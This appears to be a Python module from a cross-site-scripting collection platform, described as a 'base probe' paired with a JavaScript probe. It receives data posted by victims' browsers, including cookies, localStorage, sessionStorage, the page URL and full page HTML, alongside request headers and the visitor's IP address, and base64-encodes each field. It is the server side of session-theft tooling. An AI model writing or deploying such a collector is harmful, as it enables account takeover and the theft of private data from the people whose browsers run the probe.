#
#	get_info - base probe
#		and get_info.js
#
'''
with open('./plus/get_info.py') as files: exec files.read()
'''
serverinfo['referer'] = b64encode(str(request.headers.get('Referer')))
serverinfo['ctime'] = b64encode(ctime())
serverinfo['remote_addr'] = b64encode(str(request.environ.get('REMOTE_ADDR')))
serverinfo['x_forwarded_for'] = b64encode(str(request.headers.get('X-Forwarded-For')))
serverinfo['user_agent'] = b64encode(str(request.headers.get('User-Agent')))
serverinfo['accept_language'] = b64encode(str(request.headers.get('Accept-Language')))
serverinfo['x_requested_with'] = b64encode(str(request.headers.get('X-Requested-With')))

browserinfo['URL'] = b64encode(str(request.forms.get('url')))
browserinfo['cookie'] = b64encode(str(request.forms.get('cookie')))
browserinfo['localStorage'] = b64encode(str(request.forms.get('localStorage')))
browserinfo['sessionStorage'] = b64encode(str(request.forms.get('sessionStorage')))
browserinfo['browser'] = b64encode(str(request.forms.get('browser')))
browserinfo['user_agent'] = b64encode(str(request.forms.get('user_agent')))
browserinfo['screen'] = b64encode(str(request.forms.get('screen')))
browserinfo['istouch'] = b64encode(str(request.forms.get('istouch')))
browserinfo['referrer'] = b64encode(str(request.forms.get('referrer')))
browserinfo['os'] = b64encode(str(request.forms.get('os')))
browserinfo['date'] = b64encode(str(request.forms.get('date')))
browserinfo['plugins'] = b64encode(str(request.forms.get('plugins')))
browserinfo['websocket'] = b64encode(str(request.forms.get('websocket')))
browserinfo['java'] = b64encode(str(request.forms.get('java')))
browserinfo['page_html'] = b64encode(str(request.forms.get('page_html')))
